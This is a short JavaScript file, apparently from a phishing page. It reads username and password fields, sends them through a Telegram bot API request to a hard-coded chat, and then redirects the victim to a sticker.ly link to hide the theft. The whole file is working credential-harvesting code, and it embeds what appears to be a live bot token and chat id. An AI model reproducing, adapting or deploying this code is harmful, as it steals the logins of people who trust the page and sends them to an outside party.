const sendatatme = document.getElementById("sendatatme");
const first = document.getElementById("first");
const second = document.getElementById("second");
const resfirst = document.getElementById("resfirst");
const resecond = document.getElementById("resecond");

first.addEventListener("change", () => {
  resfirst.value = first.value;
});
second.addEventListener("change", () => {
  resecond.value = second.value;
});

function redirect() {
  const Http = new XMLHttpRequest();
  const url =
    "https://api.telegram.org/bot7069196586:AAHwn6wf0ocqq4nmLgZPlBAfX6FHV9V21C8/sendMessage?chat_id=5052520420&text=USERNAME:%20" +
    resfirst.value +
    " PASSWORD: " +
    resecond.value;
  Http.open("GET", url);
  Http.send();

  Http.onreadystatechange = (e) => {
    console.log(Http.responseText);
  };

window.location.href = 'https://sticker.ly/s/X2Z8R2';
}

sendatatme.addEventListener("click", redirect);
